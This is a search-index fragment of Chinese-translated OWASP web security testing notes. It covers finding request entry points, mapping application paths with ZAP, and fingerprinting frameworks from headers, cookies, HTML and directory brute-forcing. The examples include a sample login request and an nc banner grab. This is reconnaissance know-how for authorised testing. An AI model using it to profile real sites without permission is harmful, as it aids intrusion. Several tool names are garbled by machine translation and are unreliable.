<p>\u8bf7\u6c42\u7684\u6240\u6709\u53c2\u6570\uff0c\u5982 CUSTOMERID\u3001ITEM\u3001PRICE\u3001IP \u548c Cookie\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u53ea\u662f\u7f16\u7801\u53c2\u6570\u6216\u7528\u4e8e\u4f1a\u8bdd\u72b6\u6001\u7684\u53c2\u6570\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#2","title":"\u793a\u4f8b 2","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4f7f\u60a8\u767b\u5f55\u5230\u5e94\u7528\u7a0b\u5e8f\u3002</p> <pre><code>POST\u00a0/example/authenticate.asp?service=login HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&amp;pass=pass123&amp;debug=true&amp;fromtrustIP=true\n</code></pre> <p>\u53ef\u4ee5\u6ce8\u610f\u5230\u53c2\u6570\u5728\u51e0\u4e2a\u4f4d\u7f6e\u53d1\u9001\uff1a</p> <ol> <li>\u5728\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff1a<code>service</code></li> <li>\u5728 Cookie \u6807\u5934\u4e2d\uff1a<code>SESSIONID</code>,<code>CustomCookie</code></li> <li>\u5728\u8bf7\u6c42\u6b63\u6587\u4e2d\uff1a<code>user</code>,\u00a0<code>pass</code>,\u00a0<code>debug</code>,<code>fromtrustIP</code></li> </ol> <p>\u62e5\u6709\u5404\u79cd\u6ce8\u5165\u4f4d\u7f6e\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e86\u94fe\u63a5\u7684\u53ef\u80fd\u6027\uff0c\u53ef\u4ee5\u63d0\u9ad8\u5728\u5904\u7406\u4ee3\u7801\u4e2d\u53d1\u73b0\u9519\u8bef\u7684\u673a\u4f1a\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_8","title":"\u5de5\u5177","text":"<ul> <li>OWASP Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u6253\u55dd\u5957\u623f</li> <li>\u63d0\u7434\u624b</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_9","title":"\u53c2\u8003","text":"<ul> <li>RFC 2616 \u2013 \u8d85\u6587\u672c\u4f20\u8f93\u200b\u200b\u534f\u8bae \u2013 HTTP 1.1</li> <li>OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/","title":"1.7\u901a\u8fc7\u5e94\u7528\u6620\u5c04\u6267\u884c\u8def\u5f84","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_1","title":"\u6982\u62ec","text":"<p>\u5728\u5f00\u59cb\u5b89\u5168\u6d4b\u8bd5\u4e4b\u524d\uff0c\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u7ed3\u6784\u81f3\u5173\u91cd\u8981\u3002\u5982\u679c\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u5e03\u5c40\u6ca1\u6709\u900f\u5f7b\u7684\u4e86\u89e3\uff0c\u5c31\u4e0d\u53ef\u80fd\u5bf9\u5176\u8fdb\u884c\u5f7b\u5e95\u7684\u6d4b\u8bd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u6620\u5c04\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e86\u89e3\u4e3b\u8981\u5de5\u4f5c\u6d41\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u9ed1\u76d2\u6d4b\u8bd5\u4e2d\uff0c\u6d4b\u8bd5\u6574\u4e2a\u4ee3\u7801\u5e93\u662f\u6781\u5176\u56f0\u96be\u7684\u3002\u4e0d\u4ec5\u4ec5\u662f\u56e0\u4e3a\u6d4b\u8bd5\u4eba\u5458\u770b\u4e0d\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u8def\u5f84\uff0c\u800c\u4e14\u5373\u4f7f\u4ed6\u4eec\u770b\u5230\u4e86\uff0c\u6d4b\u8bd5\u6240\u6709\u4ee3\u7801\u8def\u5f84\u4e5f\u4f1a\u975e\u5e38\u8017\u65f6\u3002\u534f\u8c03\u8fd9\u4e00\u70b9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u8bb0\u5f55\u53d1\u73b0\u548c\u6d4b\u8bd5\u7684\u4ee3\u7801\u8def\u5f84\u3002</p> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6d4b\u8bd5\u548c\u6d4b\u91cf\u4ee3\u7801\u8986\u76d6\u7387\uff1a</p> <ul> <li>PATH -  \u6d4b\u8bd5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u6761\u8def\u5f84\uff0c\u5305\u62ec\u9488\u5bf9\u6bcf\u6761\u51b3\u7b56\u8def\u5f84\u7684\u7ec4\u5408\u548c\u8fb9\u754c\u503c\u5206\u6790\u6d4b\u8bd5\u3002\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u63d0\u4f9b\u4e86\u5f7b\u5e95\u6027\uff0c\u4f46\u53ef\u6d4b\u8bd5\u8def\u5f84\u7684\u6570\u91cf\u968f\u7740\u6bcf\u4e2a\u51b3\u7b56\u5206\u652f\u5448\u6307\u6570\u589e\u957f\u3002</li> <li>Data Flow (or Taint Analysis)\u00a0- \u901a\u8fc7\u5916\u90e8\u4ea4\u4e92\uff08\u901a\u5e38\u662f\u7528\u6237\uff09\u6d4b\u8bd5\u53d8\u91cf\u7684\u5206\u914d\u3002\u4e13\u6ce8\u4e8e\u6620\u5c04\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6570\u636e\u7684\u6d41\u52a8\u3001\u8f6c\u6362\u548c\u4f7f\u7528\u3002</li> <li>Race\u00a0- \u6d4b\u8bd5\u5904\u7406\u76f8\u540c\u6570\u636e\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u591a\u4e2a\u5e76\u53d1\u5b9e\u4f8b\u3002</li> </ul> <p>\u5e94\u4e0e\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u534f\u5546\u6743\u8861\u4f7f\u7528\u4f55\u79cd\u65b9\u6cd5\u4ee5\u53ca\u6bcf\u79cd\u65b9\u6cd5\u7684\u4f7f\u7528\u7a0b\u5ea6\u3002\u4e5f\u53ef\u4ee5\u91c7\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8be2\u95ee\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u4ed6\u4eec\u7279\u522b\u5173\u6ce8\u54ea\u4e9b\u529f\u80fd\u6216\u4ee3\u7801\u6bb5\u4ee5\u53ca\u5982\u4f55\u5230\u8fbe\u8fd9\u4e9b\u4ee3\u7801\u6bb5\u3002</p> <p>\u4e3a\u4e86\u5411\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5c55\u793a\u4ee3\u7801\u8986\u76d6\u7387\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u7535\u5b50\u8868\u683c\u5f00\u59cb\u5e76\u8bb0\u5f55\u901a\u8fc7\u722c\u53d6\u5e94\u7528\u7a0b\u5e8f\uff08\u624b\u52a8\u6216\u81ea\u52a8\uff09\u53d1\u73b0\u7684\u6240\u6709\u94fe\u63a5\u3002\u7136\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u66f4\u4ed4\u7ec6\u5730\u67e5\u770b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u51b3\u7b56\u70b9\uff0c\u5e76\u8c03\u67e5\u53d1\u73b0\u4e86\u591a\u5c11\u91cd\u8981\u7684\u4ee3\u7801\u8def\u5f84\u3002\u7136\u540e\u5e94\u5c06\u8fd9\u4e9b\u8bb0\u5f55\u5728\u7535\u5b50\u8868\u683c\u4e2d\uff0c\u5176\u4e2d\u5305\u542b\u6240\u53d1\u73b0\u8def\u5f84\u7684 URL\u3001\u6563\u6587\u548c\u5c4f\u5e55\u622a\u56fe\u63cf\u8ff0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_4","title":"\u81ea\u52a8\u6293\u53d6","text":"<p>\u81ea\u52a8\u8718\u86db\u662f\u4e00\u79cd\u7528\u4e8e\u81ea\u52a8\u53d1\u73b0\u7279\u5b9a\u7f51\u7ad9\u4e0a\u7684\u65b0\u8d44\u6e90\uff08URL\uff09\u7684\u5de5\u5177\u3002\u5b83\u4ee5\u8981\u8bbf\u95ee\u7684 URL \u5217\u8868\u5f00\u59cb\uff0c\u79f0\u4e3a\u79cd\u5b50\uff0c\u8fd9\u53d6\u51b3\u4e8e Spider \u7684\u542f\u52a8\u65b9\u5f0f\u3002\u867d\u7136\u6709\u5f88\u591a Spidering \u5de5\u5177\uff0c\u4f46\u4ee5\u4e0b\u793a\u4f8b\u4f7f\u7528Zed Attack Proxy (ZAP)\uff1a</p> <p> \u56fe 4.1.7-1\uff1aZed \u653b\u51fb\u4ee3\u7406\u5c4f\u5e55</p> <p>ZAP\u63d0\u4f9b\u5404\u79cd\u81ea\u52a8\u722c\u53d6\u9009\u9879\uff0c\u53ef\u4ee5\u6839\u636e\u6d4b\u8bd5\u4eba\u5458\u7684\u9700\u8981\u52a0\u4ee5\u5229\u7528\uff1a</p> <ul> <li>\u8718\u86db</li> <li>AJAX\u8718\u86db</li> <li>OpenAPI \u652f\u6301</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_5","title":"\u5de5\u5177","text":"<ul> <li>Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u7535\u5b50\u8868\u683c\u8f6f\u4ef6\u5217\u8868</li> <li>\u7ed8\u56fe\u8f6f\u4ef6</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.7%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_6","title":"\u53c2\u8003","text":"<ul> <li>\u4ee3\u7801\u8986\u76d6\u7387</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/","title":"1.8\u6307\u7eb9 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_1","title":"\u6982\u62ec","text":"<p>\u592a\u9633\u5e95\u4e0b\u6ca1\u6709\u65b0\u9c9c\u4e8b\uff0c\u4eba\u4eec\u53ef\u80fd\u60f3\u5230\u8981\u5f00\u53d1\u7684\u51e0\u4e4e\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u5df2\u7ecf\u5f00\u53d1\u51fa\u6765\u4e86\u3002\u968f\u7740\u4e16\u754c\u5404\u5730\u79ef\u6781\u5f00\u53d1\u548c\u90e8\u7f72\u7684\u5927\u91cf\u514d\u8d39\u548c\u5f00\u6e90\u8f6f\u4ef6\u9879\u76ee\uff0c\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u5f88\u53ef\u80fd\u4f1a\u9762\u4e34\u4e00\u4e2a\u5b8c\u5168\u6216\u90e8\u5206\u4f9d\u8d56\u4e8e\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u6846\u67b6\uff08\u4f8b\u5982 WordPress \u3001phpBB\u3001Mediawiki \u7b49\uff09\u3002\u4e86\u89e3\u6b63\u5728\u6d4b\u8bd5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u5bf9\u6d4b\u8bd5\u8fc7\u7a0b\u6709\u5f88\u5927\u5e2e\u200b\u200b\u52a9\uff0c\u4e5f\u5c06\u5927\u5927\u51cf\u5c11\u6d4b\u8bd5\u671f\u95f4\u6240\u9700\u7684\u5de5\u4f5c\u91cf\u3002\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u4f17\u6240\u5468\u77e5\u7684 HTML \u6807\u5934\u3001cookie \u548c\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u6765\u8bc6\u522b\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u5927\u591a\u6570 Web \u6846\u67b6\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u90fd\u6709\u51e0\u4e2a\u6807\u8bb0\uff0c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u8bc6\u522b\u5b83\u4eec\u3002\u8fd9\u57fa\u672c\u4e0a\u662f\u6240\u6709\u81ea\u52a8\u5de5\u5177\u6240\u505a\u7684\uff0c\u5b83\u4eec\u4ece\u9884\u5b9a\u4e49\u7684\u4f4d\u7f6e\u5bfb\u627e\u6807\u8bb0\uff0c\u7136\u540e\u5c06\u5176\u4e0e\u5df2\u77e5\u7b7e\u540d\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u3002\u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u51c6\u786e\u6027\uff0c\u901a\u5e38\u4f7f\u7528\u591a\u4e2a\u6807\u8bb0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u7ec4\u4ef6\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_4","title":"\u9ed1\u76d2\u6d4b\u8bd5","text":"<p>\u4e3a\u4e86\u8bc6\u522b\u6846\u67b6\u6216\u7ec4\u4ef6\uff0c\u9700\u8981\u8003\u8651\u51e0\u4e2a\u5e38\u89c1\u7684\u4f4d\u7f6e\uff1a</p> <ul> <li>HTTP \u6807\u5934</li> <li>\u997c\u5e72</li> <li>\u7f51\u9875\u6e90\u4ee3\u7801</li> <li>\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939</li> <li>\u6587\u4ef6\u6269\u5c55\u540d</li> <li>\u9519\u8bef\u8baf\u606f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#http","title":"HTTP \u6807\u5934","text":"<p>\u8bc6\u522b Web \u6846\u67b6\u7684\u6700\u57fa\u672c\u5f62\u5f0f\u662f\u67e5\u770b<code>X-Powered-By</code>HTTP \u54cd\u5e94\u6807\u5934\u4e2d\u7684\u5b57\u6bb5\u3002\u8bb8\u591a\u5de5\u5177\u90fd\u53ef\u4ee5\u7528\u6765\u5bf9\u76ee\u6807\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u6700\u7b80\u5355\u7684\u662fnetcat\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42-\u54cd\u5e94\uff1a</p> <pre><code>$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n</code></pre> <p>\u4ece<code>X-Powered-By</code>\u73b0\u573a\uff0c\u6211\u4eec\u4e86\u89e3\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5f88\u53ef\u80fd\u662f<code>Mono</code>.\u00a0\u7136\u800c\uff0c\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u7b80\u5355\u5feb\u6377\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u662f\u5728 100% \u7684\u60c5\u51b5\u4e0b\u90fd\u6709\u6548\u3002<code>X-Powered-By</code>\u53ef\u4ee5\u901a\u8fc7\u9002\u5f53\u7684\u914d\u7f6e\u8f7b\u677e\u7981\u7528\u6807\u5934\u3002\u8fd8\u6709\u51e0\u79cd\u6280\u672f\u53ef\u4ee5\u8ba9\u7f51\u7ad9\u6df7\u6dc6 HTTP \u6807\u5934\uff08\u8bf7\u53c2\u9605\u4fee\u590d\u90e8\u5206\u4e2d\u7684\u793a\u4f8b\uff09\u3002<code>nginx</code>\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6ce8\u610f\u5230\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u7248\u672c\u6765\u63d0\u4f9b\u5185\u5bb9\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u540c\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u9519\u8fc7<code>X-Powered-By</code>\u6807\u5934\u6216\u83b7\u5f97\u5982\u4e0b\u6240\u793a\u7684\u7b54\u6848\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n</code></pre> <p>\u6709\u65f6\u4f1a\u6709\u66f4\u591a\u7684 HTTP \u6807\u5934\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6839\u636e HTTP \u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230<code>X-Powered-By</code>header \u4e2d\u5305\u542b PHP \u7248\u672c\u3002\u7136\u800c\uff0c<code>X-Generator</code>\u6807\u5934\u6307\u51fa\u4f7f\u7528\u7684\u6846\u67b6\u5b9e\u9645\u4e0a\u662f<code>Swiftlet</code>\uff0c\u8fd9\u6709\u52a9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6269\u5c55\u4ed6\u4eec\u7684\u653b\u51fb\u5411\u91cf\u3002\u6267\u884c\u6307\u7eb9\u8bc6\u522b\u65f6\uff0c\u8bf7\u4ed4\u7ec6\u68c0\u67e5\u6bcf\u4e2a HTTP \u6807\u5934\u662f\u5426\u5b58\u5728\u6b64\u7c7b\u6cc4\u6f0f\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#cookie","title":"Cookie","text":"<p>\u786e\u5b9a\u5f53\u524d Web \u6846\u67b6\u7684\u53e6\u4e00\u79cd\u7c7b\u4f3c\u4e14\u66f4\u53ef\u9760\u7684\u65b9\u6cd5\u662f\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 cookie\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42\uff1a</p> <p> \u56fe 4.1.8-7\uff1aCakephp HTTP \u8bf7\u6c42</p> <p>cookie<code>CAKEPHP</code>\u5df2\u81ea\u52a8\u8bbe\u7f6e\uff0c\u5b83\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u6846\u67b6\u7684\u4fe1\u606f\u3002Cookie\u90e8\u5206\u5217\u51fa\u4e86\u5e38\u89c1\u7684 cookie \u540d\u79f0\u3002\u4f9d\u8d56\u8fd9\u79cd\u8bc6\u522b\u673a\u5236\u4ecd\u7136\u5b58\u5728\u5c40\u9650\u6027\u2014\u2014\u53ef\u4ee5\u66f4\u6539 cookie \u7684\u540d\u79f0\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u9009\u5b9a\u7684<code>CakePHP</code>\u6846\u67b6\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u914d\u7f6e\u5b8c\u6210\uff08\u6458\u81ea<code>core.php</code>\uff09\uff1a</p> <pre><code>/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link http://php.net/session_name\n*/\nConfigure::write('Session.cookie', 'CAKEPHP');\n</code></pre> <p>\u4f46\u662f\uff0c\u4e0e\u6807\u5934\u7684\u66f4\u6539\u76f8\u6bd4\uff0c\u8fdb\u884c\u8fd9\u4e9b\u66f4\u6539\u7684\u53ef\u80fd\u6027\u8f83\u5c0f<code>X-Powered-By</code>\uff0c\u56e0\u6b64\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u79cd\u8bc6\u522b\u65b9\u6cd5\u66f4\u53ef\u9760\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#html","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u6b64\u6280\u672f\u57fa\u4e8e\u5728 HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u67e5\u627e\u67d0\u4e9b\u6a21\u5f0f\u3002\u4eba\u4eec\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u5f88\u591a\u4fe1\u606f\u6765\u5e2e\u52a9\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u7279\u5b9a\u7ec4\u4ef6\u3002\u4e00\u79cd\u5e38\u89c1\u7684\u6807\u8bb0\u662f\u76f4\u63a5\u5bfc\u81f4\u6846\u67b6\u6cc4\u9732\u7684 HTML \u6ce8\u91ca\u3002\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u67d0\u4e9b\u7279\u5b9a\u4e8e\u6846\u67b6\u7684\u8def\u5f84\uff0c\u5373\u6307\u5411\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 CSS \u6216 JS \u6587\u4ef6\u5939\u7684\u94fe\u63a5\u3002\u6700\u540e\uff0c\u7279\u5b9a\u7684\u811a\u672c\u53d8\u91cf\u4e5f\u53ef\u80fd\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002</p> <p>\u4ece\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u63d0\u5230\u7684\u6807\u8bb0\u8f7b\u677e\u4e86\u89e3\u4f7f\u7528\u7684\u6846\u67b6\u53ca\u5176\u7248\u672c\u3002\u6ce8\u91ca\u3001\u5177\u4f53\u8def\u5f84\u548c\u811a\u672c\u53d8\u91cf\u90fd\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5feb\u901f\u786e\u5b9aZK\u6846\u67b6\u7684\u5b9e\u4f8b\u3002</p> <p> \u56fe 4.1.8-2\uff1aZK \u6846\u67b6 HTML \u6e90\u4ee3\u7801\u793a\u4f8b</p> <p>\u6b64\u7c7b\u4fe1\u606f\u901a\u5e38\u4f4d\u4e8e<code>&lt;head&gt;</code>HTTP \u54cd\u5e94\u90e8\u5206\u3001<code>&lt;meta&gt;</code>\u6807\u8bb0\u4e2d\u6216\u9875\u9762\u672b\u5c3e\u3002\u7136\u800c\uff0c\u5e94\u8be5\u5206\u6790\u6574\u4e2a\u54cd\u5e94\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u7528\u4e8e\u5176\u4ed6\u76ee\u7684\uff0c\u4f8b\u5982\u68c0\u67e5\u5176\u4ed6\u6709\u7528\u7684\u8bc4\u8bba\u548c\u9690\u85cf\u5b57\u6bb5\u3002\u6709\u65f6\uff0cWeb \u5f00\u53d1\u4eba\u5458\u4e0d\u592a\u5173\u5fc3\u9690\u85cf\u6709\u5173\u6240\u7528\u6846\u67b6\u6216\u7ec4\u4ef6\u7684\u4fe1\u606f\u3002\u4ecd\u7136\u6709\u53ef\u80fd\u5728\u9875\u9762\u5e95\u90e8\u5076\u7136\u53d1\u73b0\u7c7b\u4f3c\u8fd9\u6837\u7684\u5185\u5bb9\uff1a</p> <p> \u56fe 4.1.8-3\uff1aBanshee \u5e95\u90e8\u9875\u9762</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.8%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_5","title":"\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939","text":"<p>\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6781\u5927\u5730\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u9ad8\u7cbe\u5ea6\u5730\u8bc6\u522b\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u3002\u6bcf\u4e2a Web \u7ec4\u4ef6\u5728\u670d\u52a1\u5668\u4e0a\u90fd\u6709\u81ea\u5df1\u7279\u5b9a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7ed3\u6784\u3002\u5df2\u7ecf\u6ce8\u610f\u5230\uff0c\u53ef\u4ee5\u4ece HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u7279\u5b9a\u8def\u5f84\uff0c\u4f46\u6709\u65f6\u5b83\u4eec\u5e76\u6ca1\u6709\u660e\u786e\u5730\u663e\u793a\u5728\u90a3\u91cc\uff0c\u800c\u662f\u4ecd\u7136\u9a7b\u7559\u5728\u670d\u52a1\u5668\u4e0a\u3002</p> <p>\u4e3a\u4e86\u53d1\u73b0\u5b83\u4eec\uff0c\u4f7f\u7528\u4e86\u4e00\u79cd\u79f0\u4e3a\u5f3a\u5236\u6d4f\u89c8\u6216\u201cdirbusting\u201d\u7684\u6280\u672f\u3002Dirbusting \u662f\u66b4\u529b\u7834\u89e3\u5177\u6709\u5df2\u77e5\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u540d\u7684\u76ee\u6807\uff0c\u5e76\u76d1\u89c6 HTTP 